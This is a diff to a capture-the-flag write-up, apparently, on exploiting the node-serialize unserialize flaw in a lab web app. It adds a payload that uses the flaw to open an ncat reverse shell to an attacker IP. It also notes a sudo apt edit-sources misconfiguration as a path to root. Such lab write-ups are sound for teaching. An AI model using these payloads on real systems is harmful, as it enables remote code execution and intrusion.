@@ -96,15 +96,30 @@ _$$ND_FUNC$$_function (){require('child_process').exec('ping <attacker IP> -c 3'
 
 Keep in mind that for successful code execution, the payload must first be sent to the web application. After that, you need to send another search keyword. This way, the payload becomes your previous search query and gets unserialized when accessing the home page. The vulnerability, as mentioned earlier, lies in the unserialize function of the package, not the serialize function.
 
-Once the payload above is injected, you will observe six ICMP packets: three requests and three responses.
+Once the payload above is injected, you will observe six ICMP packets: three requests and three replies.
 
 ![image](./images/2024-09-25_18h22_19.png)
 
+Confirming that the payload works, you can modify the payload to get a reverse shell.
 
+```javascript
+_$$ND_FUNC$$_function (){require('child_process').exec('ncat <attacker IP> <attacker Port> -e /bin/bash', function(error, stdout, stderr) { console.log(stdout) });}()
+```
 
 ![image](./images/2024-09-25_18h24_52.png)
-![image](./images/2024-09-25_18h26_10.png)
+
+Upon injection of the payload above, you will get a reverse shell under the "www-data" user, which will enable you to grab the second flag for the CTF.
+
+![image](./images/2024-09-25_18h35_11.png)
+
+Moving on you can start looking around for a vulnerability/misconfiguration leading to privilege escalation.
+As a result of executing  the ```sudo -l``` command, you can see that the www-data user is allowed to run the following command with ```sudo```privileges.
+
+```
+/usr/bin/apt edit-sources ../*
+```
+
 ![image](./images/2024-09-25_18h30_58.png)
 ![image](./images/2024-09-25_18h33_34.png)
 ![image](./images/2024-09-25_18h34_12.png)
-![image](./images/2024-09-25_18h35_11.png)
+
